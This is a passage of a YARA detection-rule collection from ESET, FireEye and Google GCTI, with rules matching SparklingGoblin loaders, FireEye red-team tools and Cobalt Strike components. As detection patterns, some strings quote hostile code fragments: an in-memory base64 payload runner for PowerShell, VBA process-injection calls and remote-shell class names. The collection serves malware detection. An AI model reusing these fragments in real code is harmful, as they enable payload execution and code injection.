		hash = "29b147b76bb0d9e09f7297487cb972e6a2905586"
		hash = "33f2c3de2457b758fc5824a2b253ad7c7c2e9e37"
		hash = "45bef297ce78521eac6ee39e7603e18360e67c5a"
		hash = "4cec7cdc78d95c70555a153963064f216dae8799"
		hash = "4d4c1a062a0390b20732ba4d65317827f2339b80"
		hash = "4f6949a4906b834e83ff951e135e0850fe49d5e4"
		logic_hash = "a5c9595036dec0e0aef0a030c590189752217d15d3f53bf3dc537f5b43fae63e"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"

	condition:
		pe.rich_signature.length>= 104 and pe.rich_signature.length <= 112 and pe.rich_signature.toolid ( 241 , 40116 ) >= 5 and pe.rich_signature.toolid ( 241 , 40116 ) <= 10 and pe.rich_signature.toolid ( 147 , 30729 ) == 11 and pe.rich_signature.toolid ( 264 , 24215 ) >= 15 and pe.rich_signature.toolid ( 264 , 24215 ) <= 16
}

rule ESET_Sparklinggoblin_Etweventwrite
{
	meta:
		description = "SparklingGoblin EtwEventWrite patching"
		author = "ESET Research"
		id = "27b36ee1-a98c-5174-a156-8e0b0d0a58cd"
		date = "2021-05-20"
		modified = "2021-08-26"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/sparklinggoblin/SparklingGoblin.yar#L370-L463"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "2edbea43f5c40c867e5b6bbd93cc972525df598b"
		hash = "b6d245d3d49b06645c0578804064ce0c072cbe0f"
		hash = "8be6d5f040d0085c62b1459afc627707b0de89cf"
		hash = "4668302969fe122874fb2447a80378dcb671c86b"
		hash = "9bdecb08e16a23d271d0a3e836d9e7f83d7e2c3b"
		hash = "9ce7650f2c08c391a35d69956e171932d116b8bd"
		logic_hash = "45615dcc5302392c18052818071623a9d1a1008c460bdb24a4acfb4300356c6b"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"

	strings:
		$chunk_1 = {
            48 8D 0D ?? ?? ?? ??
            C7 44 24 ?? 48 31 C0 C3
            FF 15 ?? ?? ?? ??
            48 8B C8
            48 8D 15 ?? ?? ?? ??
            FF 15 ?? ?? ?? ??
            83 64 24 ?? 00
            4C 8D 4C 24 ??
            BF 04 00 00 00
            48 8B C8
            8B D7
            48 8B D8
            44 8D 47 ??
            FF 15 ?? ?? ?? ??
            44 8B C7
            48 8D 54 24 ??
            48 8B CB
            E8 ?? ?? ?? ??
            44 8B 44 24 ??
            4C 8D 4C 24 ??
            8B D7
            48 8B CB
            FF 15 ?? ?? ?? ??
            48 8B 05 ?? ?? ?? ??
        }
		$chunk_2 = {
            55
            8B EC
            51
            51
            57
            68 08 1A 41 00
            66 C7 45 ?? C2 14
            C6 45 ?? 00
            FF 15 ?? ?? ?? ??
            68 10 1A 41 00
            50
            FF 15 ?? ?? ?? ??
            83 65 ?? 00
            8B F8
            8D 45 ??
            50
            6A 40
            6A 03
            57
            FF 15 ?? ?? ?? ??
            6A 03
            8D 45 ??
            50
            57
            E8 ?? ?? ?? ??
            83 C4 0C
            8D 45 ??
            50
            FF 75 ??
            6A 03
            57
            FF 15 ?? ?? ?? ??
        }
		$chunk_3 = {
            48 8D 0D ?? ?? ?? ??
            C7 44 24 ?? 48 31 C0 C3
            FF 15 ?? ?? ?? ??
            48 8B C8
            48 8D 15 ?? ?? ?? ??
            FF 15 ?? ?? ?? ??
        }

	condition:
		any of them
}

rule ESET_Sparklinggoblin_Mutex
{
	meta:
		description = "SparklingGoblin ChaCha20 loaders mutexes"
		author = "ESET Research"
		id = "e33d2bc1-29d6-5117-8e0f-31f8bced0979"
		date = "2021-05-20"
		modified = "2021-08-26"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/sparklinggoblin/SparklingGoblin.yar#L465-L489"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "2edbea43f5c40c867e5b6bbd93cc972525df598b"
		hash = "b6d245d3d49b06645c0578804064ce0c072cbe0f"
		hash = "8be6d5f040d0085c62b1459afc627707b0de89cf"
		hash = "4668302969fe122874fb2447a80378dcb671c86b"
		hash = "9bdecb08e16a23d271d0a3e836d9e7f83d7e2c3b"
		hash = "9ce7650f2c08c391a35d69956e171932d116b8bd"
		logic_hash = "00fbd514c8e2d6dea3b0f175e857a613e158b64caf1f970e814d62f1ebe9d35c"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"

	strings:
		$mutex_1 = "kREwdFrOlvASgP4zWZyV89m6T2K0bIno"
		$mutex_2 = "v5EPQFOImpTLaGZes3Nl1JSKHku8AyCw"

	condition:
		any of them
}

rule FIREEYE_RT_Hacktool_PY_Impacketobfuscation_2
{
	meta:
		description = "wmiexec"
		author = "FireEye"
		id = "f1059f66-eaff-5866-bafb-c94236cf96a0"
		date = "2020-12-01"
		date = "2020-12-01"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/IMPACKETOBF (Wmiexec)/production/yara/HackTool_PY_ImpacketObfuscation_2.yar#L4-L21"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "f3dd8aa567a01098a8a610529d892485"
		logic_hash = "ccbbe507798f16c7acf0780770fdb81b2e7dc333ab8bc51e6216816276c3f14b"
		score = 75
		quality = 25
		tags = ""
		rev = 2

	strings:
		$s1 = "import random"
		$s2 = "class WMIEXEC" nocase
		$s3 = "class RemoteShell" nocase
		$s4 = /=[\x09\x20]{0,32}str\(int\(time\.time\(\)\)[\x09\x20]{0,32}-[\x09\x20]{0,32}random\.randint\(\d{1,10}[\x09\x20]{0,32},[\x09\x20]{0,32}\d{1,10}\)\)[\x09\x20]{0,32}\+[\x09\x20]{0,32}str\(uuid\.uuid4\(\)\)\.split\([\x22\x27]\-[\x22\x27]\)\[0\]/
		$s5 = /self\.__shell[\x09\x20]{0,32}=[\x09\x20]{0,32}[\x22\x27]cmd.exe[\x09\x20]{1,32}\/q[\x09\x20]{1,32}\/K [\x22\x27]/ nocase

	condition:
		all of them
}

rule FIREEYE_RT_APT_Backdoor_PS1_BASICPIPESHELL_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "8f85d6cc-fd1e-5bf3-8052-440cbeda0ac9"
		date = "2020-12-18"
		modified = "2020-12-18"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/BASICPIPESHELL/production/yara/APT_Backdoor_PS1_BASICPIPESHELL_1.yar#L5-L18"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		logic_hash = "7a9f0002055ffe826562cab3d02d8babd14c5fcd6d0b528a2988e2649034279d"
		score = 75
		quality = 63
		tags = ""

	strings:
		$s1 = "function Invoke-Client()" ascii nocase wide
		$s2 = "function Invoke-Server" ascii nocase wide
		$s3 = "Read-Host 'Enter Command:'" ascii nocase wide
		$s4 = "new-object System.IO.Pipes.NamedPipeClientStream(" ascii nocase wide
		$s5 = "new-object System.IO.Pipes.NamedPipeServerStream(" ascii nocase wide
		$s6 = " = iex $" ascii nocase wide

	condition:
		all of them
}

rule FIREEYE_RT_APT_Builder_PY_MATRYOSHKA_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "0135f3bb-28b3-5fc4-85a2-b12c46c8bc45"
		date = "2020-12-02"
		date = "2020-12-02"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/MATRYOSHKA/production/yara/APT_Builder_PY_MATRYOSHKA_1.yar#L4-L22"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "25a97f6dba87ef9906a62c1a305ee1dd"
		logic_hash = "71b26f4b319429ac356b55d22bccd1da85894d61f8c96452422de78d2d893420"
		score = 75
		quality = 50
		tags = ""
		rev = 1

	strings:
		$s1 = ".pop(0)])"
		$s2 = "[1].replace('unsigned char buf[] = \"'"
		$s3 = "binascii.hexlify(f.read()).decode("
		$s4 = "os.system(\"cargo build {0} --bin {1}\".format("
		$s5 = "shutil.which('rustc')"
		$s6 = "~/.cargo/bin"
		$s7 = /[\x22\x27]\\\\x[\x22\x27]\.join\(\[\w{1,64}\[\w{1,64}:\w{1,64}[\x09\x20]{0,32}\+[\x09\x20]{0,32}2\]/

	condition:
		all of them
}

rule FIREEYE_RT_Hunting_Gadgettojscript_1
{
	meta:
		description = "This rule is looking for B64 offsets of LazyNetToJscriptLoader which is a namespace specific to the internal version of the GadgetToJScript tooling."
		author = "FireEye"
		id = "76c932e0-55b3-56ef-bab6-eb6997b51ee7"
		date = "2020-12-09"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/G2JS/production/yara/Hunting_GadgetToJScript_1.yar#L4-L17"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "7af24305a409a2b8f83ece27bb0f7900"
		logic_hash = "a880c20e61376dacd4e3a04f2cf065f19067c29371180b1dec186172cadf9564"
		score = 50
		quality = 75
		tags = ""
		rev = 4

	strings:
		$s1 = "GF6eU5ldFRvSnNjcmlwdExvYWRl"
		$s2 = "henlOZXRUb0pzY3JpcHRMb2Fk"
		$s3 = "YXp5TmV0VG9Kc2NyaXB0TG9hZGV"

	condition:
		any of them
}

rule FIREEYE_RT_Hunting_B64Engine_Dotnettojscript_Dos
{
	meta:
		description = "This file may enclude a Base64 encoded .NET executable. This technique is used by the project DotNetToJScript which is used by many malware families including GadgetToJScript."
		author = "FireEye"
		id = "24c9c259-9bb9-5f46-9278-4fa20eb3c8c4"
		date = "2020-12-09"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/G2JS/production/yara/Hunting_B64Engine_DotNetToJScript_Dos.yar#L4-L15"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "7af24305a409a2b8f83ece27bb0f7900"
		logic_hash = "e2afb43af469f8ae02f6fd21db6dbd45c997fb003e3aeeaa0d4ff3e85c64159a"
		score = 50
		quality = 75
		tags = ""
		rev = 1

	strings:
		$b64_mz = "AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEU"

	condition:
		$b64_mz
}

rule FIREEYE_RT_APT_Backdoor_Win_Gorat_Memory
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "16fb1db7-711c-5d8d-9203-738c94f253fe"
		date = "2020-12-09"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE (Gorat)/production/yara/APT_Backdoor_Win_GoRat_Memory.yar#L4-L27"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "88272e59325d106f96d6b6f1d57daf968823c1e760067dee0334c66c521ce8c2"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$murica = "murica" fullword
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or #murica > 10 or 3 of ( $rat* )
}

rule FIREEYE_RT_Trojan_Macro_RESUMEPLEASE_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "068662f6-28b8-5538-8bc3-6506565305ae"
		date = "2020-12-01"
		date = "2020-12-01"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/RESUMEPLEASE/production/yara/Trojan_Macro_RESUMEPLEASE_1.yar#L4-L21"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d5d3d23c8573d999f1c48d3e211b1066"
		logic_hash = "040457bc446e496431129ff4623ddda5d9c2ce339ba65a7fbe42114626f36c60"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$str00 = "For Binary As"
		$str01 = "Range.Text"
		$str02 = "Environ("
		$str03 = "CByte("
		$str04 = ".SpawnInstance_"
		$str05 = ".Create("

	condition:
		all of them
}

rule FIREEYE_RT_APT_Builder_PY_REDFLARE_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "3b5ad25d-ce66-572e-9a91-40a73b8fd447"
		date = "2020-11-27"
		date = "2020-11-27"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE/production/yara/APT_Builder_PY_REDFLARE_1.yar#L4-L22"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d0a830403e56ebaa4bfbe87dbfdee44f"
		logic_hash = "1948cadb7242eb69bffbc222802ce9c1af38d7a846da09b6343b1449fe054e42"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$1 = "LOAD_OFFSET_32 = 0x612"
		$2 = "LOAD_OFFSET_64 = 0x611"
		$3 = "class RC4:"
		$4 = "struct.pack('<Q' if is64b else '<L'"
		$5 = "stagerConfig['comms']['config']"
		$6 = "_x86.dll"
		$7 = "_x64.dll"

	condition:
		all of them and @1 [ 1 ] < @2 [ 1 ] and @2 [ 1 ] < @3 [ 1 ] and @3 [ 1 ] < @4 [ 1 ] and @4 [ 1 ] < @5 [ 1 ]
}

rule FIREEYE_RT_Hacktool_PY_Impacketobfuscation_1
{
	meta:
		description = "smbexec"
		author = "FireEye"
		id = "992d1132-3136-5e1b-a1ef-dcdf36ebf0f5"
		date = "2020-12-01"
		date = "2020-12-01"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/IMPACKETOBF (Smbexec)/production/yara/HackTool_PY_ImpacketObfuscation_1.yar#L4-L22"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "0b1e512afe24c31531d6db6b47bac8ee"
		logic_hash = "45a4c0426b29b8c8bede9c4e8292131da7e756d48fc3ac4a07d08fd52383d21e"
		score = 75
		quality = 50
		tags = ""
		rev = 1

	strings:
		$s1 = "class CMDEXEC" nocase
		$s2 = "class RemoteShell" nocase
		$s3 = "self.services_names"
		$s4 = "import random"
		$s6 = /self\.__shell[\x09\x20]{0,32}=[\x09\x20]{0,32}[\x22\x27]%CoMSpEC%[\x09\x20]{1,32}\/q[\x09\x20]{1,32}\/K [\x22\x27]/ nocase
		$s7 = /self\.__serviceName[\x09\x20]{0,32}=[\x09\x20]{0,32}self\.services_names\[random\.randint\([\x09\x20]{0,32}0[\x09\x20]{0,32},[\x09\x20]{0,32}len\(self\.services_names\)[\x09\x20]{0,32}-[\x09\x20]{0,32}1\)\]/

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Elevate_Dll_V3_0_To_V3_14_And_Sleeve_Elevate_Dll_V4_X
{
	meta:
		description = "Cobalt Strike's resources/elevate.dll signature for v3.0 to v3.14 and sleeve/elevate.dll for v4.x"
		author = "gssincla@google.com"
		id = "170f62a2-ba4f-5be8-9ec5-402eb7bbde4e"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Elevate_Dll_v3_0_to_v3_14_and_Sleeve_Elevate_Dll_v4_x.yara#L17-L68"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "6deeb2cafe9eeefe5fc5077e63cc08310f895e9d5d492c88c4e567323077aa2f"
		logic_hash = "766a0a390ed8cefe43d82a054a9b2cfec7eced75e0d7ee10231215043577b75e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$wnd_proc = {
			6A 00
			6A 28
			68 00 01 00 00
			5? 
			C7 [5] 01 00 00 00 
			FF ?? 
			6A 00
			6A 27
			68 00 01 00 00
			5? 
			FF ?? 
			6A 00
			6A 00
			68 01 02 00 00
			5? 
			FF ?? 
		}

	condition:
		$wnd_proc
}

rule GCTI_Cobaltstrike_Resources_Bypassuactoken_Dll_V3_11_To_V3_14
{
	meta:
		description = "Cobalt Strike's resources/bypassuactoken.dll from v3.11 to v3.14 (32-bit version)"
		author = "gssincla@google.com"
		id = "b9f25fa5-bd1d-5ba0-9b1d-bb97e1dbf76b"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Bypassuactoken_Dll_v3_11_to_v3_14.yara#L17-L151"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "df1c7256dfd78506e38c64c54c0645b6a56fc56b2ffad8c553b0f770c5683070"
		logic_hash = "fe0780b7f4c16b55cfa00ea7de4da8ce349ec8a72de763b72e816ebc8e934b6d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$isHighIntegrityProcess = {
			5? 
			5? 
			5? 
			8B ?? 
			6A 19
			5? 
			FF 15 [4]
			85 C0
			75 ?? 
			FF 15 [4]
			83 ?? 7A 
			75 ?? 
			FF [2]
			5? 
			FF 15 [4]
			8B ?? 
			8D [2]
			5? 
			FF [2]
			5? 
			6A 19
			5? 
			FF 15 [4]
			85 C0
			74 ?? 
			FF ?? 
			FF 15 [4]
			8A ?? 
			FE C8
			0F B6 C0
			5? 
			FF ?? 
			FF 15 [4]
			B? 01 00 00 00 
			5? 
			81 ?? 00 30 00 00 
		}
		$executeTaskmgr = {
			6A 3C
			8D ?? C4 
			8B ?? 
			6A 00
			5? 
			8B ?? 
			E8 [4]
			83 C4 0C
			C7 [2] 3C 00 00 00 
			8D [2]
			C7 [2] 40 00 00 00 
			C7 [6]
			C7 [2] 00 00 00 00 
			5? 
			C7 [2] 00 00 00 00 
			C7 [6]
			C7 [2] 00 00 00 00 
			FF 15 [4]
			FF 75 FC
		}

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Httpstager64_Bin_V3_2_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/httpstager64.bin signature for versions v3.2 to v4.x"
		author = "gssincla@google.com"
		id = "5530dce8-e5a1-5133-9b05-464e3397084a"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Httpstager64_Bin_v3_2_through_v4_x.yara#L17-L85"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ad93d1ee561bc25be4a96652942f698eac9b133d8b35ab7e7d3489a25f1d1e76"
		logic_hash = "23666169565c6b3e5fa71767dc31096e7a25be049eeab16b074053d76c97c70b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			48 [2]
			AC
			41 [2] 0D
			41 [2]
			38 ??
			75 ??
			4C [4]
			45 [2]
			75 ??
			5?
			44 [2] 24
			49 [2]
			66 [4]
			44 [2] 1C
			49 [2]
			41 [3]
			48 
		}
		$postInternetOpenJmp = {
			41 ?? 3A 56 79 A7
			FF ??
			EB 
		}

	condition:
		$apiLocator and $postInternetOpenJmp
}

rule GCTI_Cobaltstrike_Resources_Command_Ps1_V2_5_To_V3_7_And_Resources_Compress_Ps1_V3_8_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/command.ps1 for versions 2.5 to v3.7 and resources/compress.ps1 from v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "c0b81deb-ed20-5f7e-8e15-e6a9e9362594"
		date = "2022-11-18"
		modified = "2022-11-22"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Command_Ps1_v2_5_to_v3_7_and_Resources_Compress_Ps1_v3_8_to_v4_x.yara#L17-L33"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "932dec24b3863584b43caf9bb5d0cfbd7ed1969767d3061a7abdc05d3239ed62"
		logic_hash = "31cf47060757b086d325cd205724a7be8931bbbc6ff2f4be67a6179ee99c42ca"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ps1 = "$s=New-Object \x49O.MemoryStream(,[Convert]::\x46romBase64String(" nocase
		$ps2 = "));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_X86_Vba_V3_8_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/template.x86.vba signature for versions v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "11c7758e-93b2-5fe3-873d-b98de579d2b4"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x86_Vba_v3_8_to_v4_x.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "7114515477d82651806eccef34f599f6ffd4614f987dee29417ac6ef7a1a1c38"
		score = 75
		quality = 85
		tags = ""

	strings:
		$createstuff = "Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\"" nocase
		$allocstuff = "Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\"" nocase
		$writestuff = "Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\"" nocase
		$runstuff = "Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\"" nocase
		$vars = "Dim rwxpage As Long" nocase
		$res = "RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)"
		$rwxpage = "AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)"

	condition:
		all of them and @vars [ 1 ] < @res [ 1 ] and @allocstuff [ 1 ] < @rwxpage [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Bypassuac_Dll_V1_49_To_V3_14_And_Sleeve_Bypassuac_Dll_V4_0_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/bypassuac(-x86).dll from v1.49 to v3.14 (32-bit version) and sleeve/bypassuac.dll from v4.0 to at least v4.4"
		author = "gssincla@google.com"
		id = "614046b5-cf81-56a5-8824-b3a7e14a8ed5"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Bypassuac_Dll_v1_49_to_v3_14_and_Sleeve_Bypassuac_Dll_v4_0_to_v4_x.yara#L17-L94"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "91d12e1d09a642feedee5da966e1c15a2c5aea90c79ac796e267053e466df365"
		logic_hash = "7d59c0286f1936e386519a919472d01581b68a8167c89bd3cd3108d45251119a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$deleteFileCOM = {
			A1 [4]
			6A 00
			8B ?? 
			5? 
			5? 
			FF ?? 48 
			85 ?? 
			75 ?? 
			A1 [4]
			5? 
			8B ?? 
			FF ?? 54 
		}
		$copyFileCOM = {
			A1 [4]
			6A 00
			FF [2]
			8B ?? 
			FF [5]
			FF [5]
			5? 
			FF ?? 40 
			85 ?? 
			[2 - 6]
			A1 [4]
			5? 
			8B ?? 
			FF ?? 54 
		}

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Httpsstager_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/httpsstager.bin signature for versions 2.5 to 4.x"
		author = "gssincla@google.com"
		id = "f45aa40a-3936-50f9-a60e-de7181862d19"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Httpsstager_Bin_v2_5_through_v4_x.yara#L17-L95"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "5ebe813a4c899b037ac0ee0962a439833964a7459b7a70f275ac73ea475705b3"
		logic_hash = "d2f722809a59faf8ecd85e46eadf58bf23ba5f515ad9c949843f1e6bfeec1fbf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			31 ?? 
			AC
			C1 ?? 0D 
			01 ?? 
			38 ?? 
			75 ?? 
			03 [2]
			3B [2]
			75 ?? 
			5? 
			8B ?? 24 
			01 ?? 
			66 8B [2]
			8B ?? 1C 
			01 ?? 
			8B ?? 8B 
			01 ?? 
			89 [3]
			5? 
			5? 
		}
		$InternetSetOptionA = {
			6A 04
			5? 
			6A 1F
			5? 
			68 75 46 9E 86
			FF  
		}

	condition:
		$apiLocator and $InternetSetOptionA
}

rule GCTI_Cobaltstrike_Resources__Template_Vbs_V3_3_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/btemplate.vbs signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "62f35d02-1e4e-5651-b575-888ce06b8bdd"
		date = "2022-11-18"
		modified = "2022-11-22"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Vbs_v3_3_to_v4_x.yara#L17-L41"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
